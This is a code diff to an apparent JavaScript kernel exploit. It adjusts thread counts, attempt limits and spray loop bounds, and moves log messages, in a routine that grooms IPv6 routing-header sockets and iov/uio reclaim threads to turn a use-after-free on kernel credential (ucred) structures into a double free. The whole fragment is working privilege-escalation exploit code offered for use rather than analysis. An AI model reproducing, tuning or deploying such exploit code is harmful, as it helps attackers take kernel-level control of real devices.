@@ -7,12 +7,12 @@ include("loader.js");
 include("kernel.js");
 
 //#region Variables
-var IOV_THREAD_NUM = 4;
-var UIO_THREAD_NUM = 1;
+var ATTEMPT_NUM = 8;
+var IOV_THREAD_NUM = 3;
+var UIO_THREAD_NUM = 3;
 var IPV6_SOCK_NUM = 0x20;
 var FIND_TWINS_NUM = 0x20;
 var FIND_TRIPLET_NUM = 0x20;
-var ATTEMPT_NUM = 0x10;
 var SPRAY_IOV_NUM = 0x200;
 var SPRAY_UIO_NUM = 0x200;
 var LEAK_KQUEUE_NUM = 0x400;
@@ -220,6 +220,8 @@ function stop_uio_threads() {
 }
 
 function find_twins() {
+    log("Looking for twins...");
+
     for (var i = 0; i < FIND_TWINS_NUM; i++) {
         for (var j = 0; j < ipv6_socks.length; j++) {
             view(spray_rthdr0_addr).setUint32(4, (j << 0x10) | 0x1337, true); // ip6_rthdr0.ip6r0_reserved
@@ -238,6 +240,8 @@ function find_twins() {
 
                 twins[0] = ipv6_socks[j];
                 twins[1] = ipv6_socks[idx];
+                
+                log(`Found twins: ${twins} !!`);
 
                 return;
             }
@@ -452,7 +456,7 @@ function ucred_triple_free() {
             debug("Signaling work to iov threads...");
 
             // Set cr_refcnt back to 1
-            for (var j = 0; j < 0x20; j++) {
+            for (var j = 0; j < 0x40; j++) {
                 // Reclaim with iov.
                 iov_worker.signal_work(COMMAND_IOV_RECVMSG);
                 if (sched_yield.invoke().eq(-1)) {
@@ -484,8 +488,6 @@ function ucred_triple_free() {
                 throw new SyscallError(`Unable to close fd ${uaf_sock_dup} !!`);
             }
         
-            log("Looking for twins...");
-        
             // Find twins
             find_twins();
 
@@ -511,8 +513,6 @@ function ucred_triple_free() {
     if (i === ATTEMPT_NUM) {
         throw new Error("Unable to ucred double free !!");
     }
-
-    log(`Found twins: ${twins} !!`);
 
     log(`Ucred double free achieved !!`);
 
